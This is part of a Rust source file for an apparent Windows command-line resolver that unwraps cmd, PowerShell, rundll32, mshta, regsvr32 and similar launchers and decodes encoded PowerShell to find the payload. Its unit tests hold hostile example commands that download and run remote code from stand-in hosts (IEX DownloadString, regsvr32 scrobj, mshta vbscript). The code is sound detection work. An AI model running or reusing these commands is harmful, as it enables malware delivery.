            }
            continue;
        }
        if l.starts_with('/') || l.starts_with('-') {
            continue;
        }
        if dll.is_none() {
            dll = Some(t.text.clone());
        }
    }
    if let Some(d) = dll {
        let d = env.expand(&d);
        r.set_payload(&d, is_url(&d));
    }
}

fn unwrap_conhost(rest: &str, env: &Env, depth: usize, r: &mut Resolved) {
    let toks = tokenize(rest);
    let mut i = 0;
    while let Some(t) = toks.get(i) {
        let l = t.text.to_ascii_lowercase();
        if l == "--headless" {
            r.flags.headless = true;
            i += 1;
            continue;
        }
        if matches!(
            l.as_str(),
            "--width" | "--height" | "--signal" | "--server" | "--feature"
        ) {
            i += 2;
            continue;
        }
        if l.starts_with("--") || l.starts_with("0x") || l == "-forcev1" {
            i += 1;
            continue;
        }
        unwrap(&rest[t.start..], env, depth + 1, r);
        return;
    }
}

/// forfiles `/c` supports `0xHH` escapes.
fn forfiles_unescape(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'0'
            && i + 3 < b.len()
            && (b[i + 1] == b'x' || b[i + 1] == b'X')
            && b[i + 2].is_ascii_hexdigit()
            && b[i + 3].is_ascii_hexdigit()
        {
            let h = std::str::from_utf8(&b[i + 2..i + 4])
                .ok()
                .and_then(|h| u8::from_str_radix(h, 16).ok());
            if let Some(v) = h {
                out.push(v);
                i += 4;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

// ---------------------------------------------------------------------------
// base64 (PowerShell -EncodedCommand is base64 of UTF-16LE)
// ---------------------------------------------------------------------------

/// Decode standard or URL-safe base64; whitespace ignored, padding optional.
pub(crate) fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let s = truncate(s.trim().trim_matches(['"', '\'']), 64 * 1024);
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let mut buf: u32 = 0;
    let mut bits = 0u32;
    for c in s.bytes() {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            b' ' | b'\t' | b'\r' | b'\n' => continue,
            _ => return None,
        } as u32;
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

/// `-EncodedCommand` value → text (UTF-16LE, falling back to UTF-8).
pub(crate) fn decode_ps_base64(s: &str) -> Option<String> {
    let bytes = base64_decode(s)?;
    let zeros = bytes.iter().skip(1).step_by(2).filter(|b| **b == 0).count();
    if bytes.len() >= 2 && zeros * 2 >= bytes.len() / 2 {
        let units: Vec<u16> = bytes
            .as_chunks::<2>()
            .0
            .iter()
            .map(|c| u16::from_le_bytes(*c))
            .collect();
        Some(String::from_utf16_lossy(&units))
    } else {
        Some(String::from_utf8_lossy(&bytes).into_owned())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env() -> Env {
        Env::new('c', Some(r"C:\Users\alice"))
    }

    fn b64_utf16(s: &str) -> String {
        const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let bytes: Vec<u8> = s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let mut out = String::new();
        for ch in bytes.chunks(3) {
            let n = (ch[0] as u32) << 16
                | (*ch.get(1).unwrap_or(&0) as u32) << 8
                | *ch.get(2).unwrap_or(&0) as u32;
            for k in 0..4 {
                if k <= ch.len() {
                    out.push(T[((n >> (18 - 6 * k)) & 63) as usize] as char);
                } else {
                    out.push('=');
                }
            }
        }
        out
    }

    #[test]
    fn env_expansion() {
        let e = env();
        assert_eq!(
            e.expand(r"%APPDATA%\x\a.exe"),
            r"C:\Users\alice\AppData\Roaming\x\a.exe"
        );
        assert_eq!(
            e.expand(r"%localappdata%\a"),
            r"C:\Users\alice\AppData\Local\a"
        );
        assert_eq!(
            e.expand(r"%ProgramFiles(x86)%\A\b.exe"),
            r"C:\Program Files (x86)\A\b.exe"
        );
        // unknown stays literal, percent signs survive
        assert_eq!(e.expand(r"%NOPE%\a %1 100%"), r"%NOPE%\a %1 100%");
        assert_eq!(e.expand("%%TEMP%%"), r"%C:\Users\alice\AppData\Local\Temp%");
        let anon = Env::new('d', None);
        assert_eq!(
            anon.expand(r"%TEMP%\x.exe"),
            r"D:\Users\%USERNAME%\AppData\Local\Temp\x.exe"
        );
        assert_eq!(e.clone().with_var("FOO", "bar").expand("%foo%"), "bar");
    }

    #[test]
    fn argv_rules() {
        let t: Vec<String> = tokenize(r#"a "b c" d\"e "f\\" g\\h "x""y""#)
            .into_iter()
            .map(|a| a.text)
            .collect();
        assert_eq!(t, ["a", "b c", "d\"e", "f\\", r"g\\h", "x\"y"]);
        assert!(tokenize("   ").is_empty());
        assert_eq!(tokenize(r#""unterminated arg"#)[0].text, "unterminated arg");
    }

    #[test]
    fn quoted_and_plain_images() {
        let r = resolve(
            r#""C:\Users\alice\AppData\Roaming\Upd\upd.exe" --silent"#,
            &env(),
        );
        assert_eq!(r.image, r"C:\Users\alice\AppData\Roaming\Upd\upd.exe");
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Roaming\Upd\upd.exe")
        );
        assert!(r.chain.is_empty());
        assert!(!r.flags.unquoted_spaces);
        let r = resolve(r"%APPDATA%\svc\svchost32.exe", &env());
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Roaming\svc\svchost32.exe")
        );
    }

    #[test]
    fn unquoted_program_files() {
        let r = resolve(
            r"C:\Program Files\Acme Tools\agent.exe /background -x",
            &env(),
        );
        assert_eq!(r.image, r"C:\Program Files\Acme Tools\agent.exe");
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Program Files\Acme Tools\agent.exe")
        );
        assert!(r.flags.unquoted_spaces);
        // no executable extension anywhere: first token
        let (img, rest, amb) = split_image(r"C:\Program Files\Thing");
        assert_eq!(
            (img.as_str(), rest, amb),
            (r"C:\Program", r" Files\Thing", false)
        );
    }

    #[test]
    fn powershell_encoded() {
        let inner = "IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1')";
        let cmd = format!("powershell.exe -nop -w hidden -enc {}", b64_utf16(inner));
        let r = resolve(&cmd, &env());
        assert_eq!(r.chain, ["powershell.exe"]);
        assert_eq!(r.decoded.as_deref(), Some(inner));
        assert!(r.flags.encoded && r.flags.hidden && r.flags.download && r.flags.iex);
        assert_eq!(r.payload.as_deref(), Some("https://evil.example/a.ps1"));
        assert!(r.payload_is_url && r.flags.remote);
        // -e / -ec abbreviations, -ep bypass
        let r = resolve(
            &format!("pwsh -ep bypass -ec {}", b64_utf16("Write-Host hi")),
            &env(),
        );
        assert!(r.flags.encoded && r.flags.bypass && !r.flags.download);
        assert_eq!(r.decoded.as_deref(), Some("Write-Host hi"));
    }

    #[test]
    fn nested_cmd_start_powershell() {
        let r = resolve(
            r#"cmd.exe /c start "" powershell -w hidden -c "iex(irm https://check-captcha.top/v)""#,
            &env(),
        );
        assert_eq!(r.chain, ["cmd.exe", "powershell.exe"]);
        assert!(r.flags.hidden && r.flags.iex && r.flags.download);
        assert_eq!(r.payload.as_deref(), Some("https://check-captcha.top/v"));
        // outer quotes stripped (more than two quotes), builtins skipped
        let r = resolve(
            r#"C:\Windows\system32\cmd.exe /q /c "timeout 3 & start "" /min "%LOCALAPPDATA%\x\run.bat"""#,
            &env(),
        );
        assert_eq!(r.chain, ["cmd.exe"]);
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Local\x\run.bat")
        );
        assert!(r.flags.hidden);
        // cleanup RunOnce of an installer: only builtins → no payload
        let r = resolve(
            r#"cmd /q /c rmdir /s /q "C:\Users\alice\AppData\Local\x""#,
            &env(),
        );
        assert_eq!(r.payload, None);
        assert!(r.flags.describe().is_empty());
    }

    #[test]
    fn rundll32_variants() {
        let r = resolve(
            r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://x.example/r")"#,
            &env(),
        );
        assert!(r.flags.script_proto);
        assert_eq!(r.chain, ["rundll32.exe"]);
        assert_eq!(r.payload.as_deref(), Some("https://x.example/r"));
        let r = resolve(
            r#"rundll32 "C:\Users\alice\AppData\Local\Temp\a b\x.dll",DllMain"#,
            &env(),
        );
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Local\Temp\a b\x.dll")
        );
        let r = resolve(r"rundll32.exe %APPDATA%\m\core.dll #1", &env());
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Roaming\m\core.dll")
        );
        // url.dll proxy execution
        let r = resolve(
            r"rundll32 url.dll,FileProtocolHandler C:\Users\alice\AppData\Roaming\a.hta",
            &env(),
        );
        assert_eq!(r.chain, ["rundll32.exe", "mshta.exe"]);
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Roaming\a.hta")
        );
    }

    #[test]
    fn mshta_regsvr32_wscript_conhost() {
        let r = resolve("mshta https://cdn-check.top/doc.hta", &env());
        assert!(r.payload_is_url && r.flags.remote);
        let r = resolve(
            r#"mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -w hidden -enc AAAA"",0:close")"#,
            &env(),
        );
        assert!(r.flags.script_proto && r.flags.encoded && r.flags.hidden);
        assert!(r.via("powershell.exe"));
        let r = resolve(
            "regsvr32 /s /n /u /i:http://x.example/f.sct scrobj.dll",
            &env(),
        );
        assert!(r.flags.remote && r.flags.download);
        assert_eq!(r.payload.as_deref(), Some("http://x.example/f.sct"));
        let r = resolve(
            r#"wscript.exe //B //E:jscript "%APPDATA%\up\run.js""#,
            &env(),
        );
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Roaming\up\run.js")
        );
        let r = resolve(
            r#"conhost.exe --headless powershell -c "iwr http://a.example/p -OutFile $env:TEMP\p.exe""#,
            &env(),
        );
        assert!(r.flags.headless && r.flags.download);
        assert_eq!(r.chain, ["conhost.exe", "powershell.exe"]);
        // a script file run by association
        let r = resolve(r"C:\Users\Public\a.vbs", &env());
        assert_eq!(r.chain, ["wscript.exe"]);
    }

    #[test]
    fn forfiles_explorer_msiexec_interpreters() {
        let r = resolve(
            r#"forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c 0x22%APPDATA%\x\a.exe0x22""#,
            &env(),
        );
        assert!(r.via("forfiles.exe") && r.via("cmd.exe"));
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Roaming\x\a.exe")
        );
        let r = resolve(
            r"explorer.exe C:\Users\alice\AppData\Roaming\x\b.exe",
            &env(),
        );
        assert_eq!(r.chain, ["explorer.exe"]);
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Roaming\x\b.exe")
        );
        let r = resolve("msiexec /q /i https://x.example/a.msi", &env());
        assert!(r.flags.download && r.payload_is_url);
        let r = resolve(
            r"C:\Users\alice\AppData\Local\AutoIt\AutoIt3.exe C:\Users\alice\AppData\Local\AutoIt\x.a3x",
            &env(),
        );
        assert_eq!(r.chain, ["autoit3.exe"]);
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Local\AutoIt\x.a3x")
        );
        let r = resolve(r"pythonw.exe -u %LOCALAPPDATA%\p\m.py", &env());
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Users\alice\AppData\Local\p\m.py")
        );
    }

    #[test]
    fn service_image_forms() {
        let r = resolve(r"\SystemRoot\System32\drivers\foo.sys", &env());
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Windows\System32\drivers\foo.sys")
        );
        let r = resolve(r"system32\drivers\bar.sys", &env());
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Windows\system32\drivers\bar.sys")
        );
        let r = resolve(r"\??\C:\Users\Public\k.sys", &env());
        assert_eq!(r.payload.as_deref(), Some(r"C:\Users\Public\k.sys"));
        let r = resolve(r"%SystemRoot%\system32\svchost.exe -k netsvcs -p", &env());
        assert_eq!(
            r.payload.as_deref(),
            Some(r"C:\Windows\system32\svchost.exe")
        );
    }

    #[test]
    fn depth_is_bounded_and_garbage_is_safe() {
        let mut c = String::from("calc.exe");
        for _ in 0..10 {
            c = format!("cmd /c {c}");
        }
        let r = resolve(&c, &env());
        assert!(r.chain.len() <= MAX_DEPTH + 1);
        for junk in [
            "",
            "\"",
            "\"\"",
            "cmd /c",
            "powershell -enc",
            "powershell -enc !!!",
            "rundll32",
            "regsvr32 /i:",
            "%",
            "%%%",
            "^&|",
            "\u{2013}c",
            "conhost --width",
        ] {
            let _ = resolve(junk, &env());
        }
        assert_eq!(base64_decode("!!"), None);
        assert_eq!(decode_ps_base64(&b64_utf16("ab")).as_deref(), Some("ab"));
    }
}
